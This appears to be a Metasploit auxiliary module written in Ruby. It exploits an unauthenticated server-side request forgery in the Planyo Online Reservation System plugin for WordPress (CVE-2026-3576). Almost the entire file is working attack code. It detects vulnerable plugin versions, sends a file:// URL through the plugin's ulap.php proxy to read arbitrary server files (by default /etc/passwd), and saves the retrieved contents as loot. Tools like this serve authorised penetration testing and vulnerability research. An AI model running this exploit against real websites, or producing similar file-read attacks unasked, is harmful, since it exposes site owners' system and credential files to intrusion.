##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress Planyo Online Reservation System Arbitrary File Read (CVE-2026-3576)',
        'Description' => %q{
          This module exploits a Server Side Request Forgery (SSRF) vulnerability in Wordpress's Planyo Online Reservation System v3.0 or less.
          The plugin's AJAX proxy ulap.php does not require authentication and does not validate URL scheme supplied via ulap_url parameter.
          This allows unauthenticated attackers to supply file:// URLs to ulap.php and retrieve local files from the system.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sinn3r', # Used sinn3r's yaws_traversal exploit module as a skeleton
          'Balachandar Gowrisankar'
        ],
        'References' => [
          ['CVE', '2026-3576'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2026-3576'],
          ['GHSA', 'jjq9-3x6f-75pj']
        ],
        'DisclosureDate' => '2026-07-10',
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd']),
        OptString.new('TARGETURI', [true, 'Base path to the Wordpress installation', '/'])
      ]
    )
  end

  # Plugin versions prior to 3.1 do not have a stable tag or version in readme.txt. So implemented a module to extract version from changelog portion of readme.txt
  def check_plugin_version_from_changelog(fixed_version)
    changelog_url = '/wp-content/plugins/planyo-online-reservation-system/readme.txt'
    res = send_request_cgi(
      'uri' => "/#{datastore['TARGETURI']}/#{changelog_url}",
      'method' => 'GET'
    )

    if res.nil? || res.code != 200
      return Msf::Exploit::CheckCode::Unknown(res ? "Response code=#{res.code}" : 'No response')
    end

    body = res.body.to_s
    changelog = body[/==\s*Changelog\s*==(.*)/mi, 1]

    versions = changelog.scan(/^\s*=\s*v?([0-9A-Za-z._-]+)\s*=\s*$/)

    if Rex::Version.new(versions.last.first) <= Rex::Version.new(fixed_version)
      return Msf::Exploit::CheckCode::Appears(details: { version: versions.last.first })
    else
      return Msf::Exploit::CheckCode::Safe(details: { version: versions.last.first })
    end
  end

  def run
    # Check if server is reachable and Wordpress is installed
    unless wordpress_and_online?
      print_error('Server not online or not detected as wordpress')
      return
    end

    # Check if filename is specified
    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
      print_error('Please supply the name of the file you want to download')
      return
    end

    # Check if plugin version is vulnerable
    readme_code = check_plugin_version_from_readme('planyo-online-reservation-system', '3.0')

    if readme_code == Msf::Exploit::CheckCode::Unknown
      print_error('Plugin\'s version could not be found. Try overriding vulnerability check')
      return
    elsif readme_code == Msf::Exploit::CheckCode::Safe
      print_good("Plugin found: #{readme_code.details}")
      print_error('This version of plugin is not vulnerable')
      return
    # Check version from changelog section if stable tag or version details are not present in readme.txt
    elsif readme_code == Msf::Exploit::CheckCode::Detected
      changelog_code = check_plugin_version_from_changelog('3.0')
      if changelog_code == Msf::Exploit::CheckCode::Safe
        print_good("Plugin found: #{changelog_code.details}")
        print_error('This version of plugin is not vulnerable')
        return
      end
    end
    print_good('Vulnerable version of plugin detected')

    # Create request
    route = 'wp-content/plugins/planyo-online-reservation-system/ulap.php?ulap_url=file://localhost'
    res = send_request_raw({
      'method' => 'GET',
      'uri' => "/#{datastore['TARGETURI']}/#{route}/#{datastore['FILEPATH']}"
    }, 25)

    # Show data if needed
    if res && res.code == 200
      vprint_line(res.to_s)
      fname = File.basename(datastore['FILEPATH'])

      path = store_loot(
        'planyo.http',
        'application/octet-stream',
        datastore['RHOST'],
        res.body,
        fname
      )
      print_status("File saved to: #{path}")
    else
      print_error('Nothing was downloaded. Check the file path')
    end
  end
end
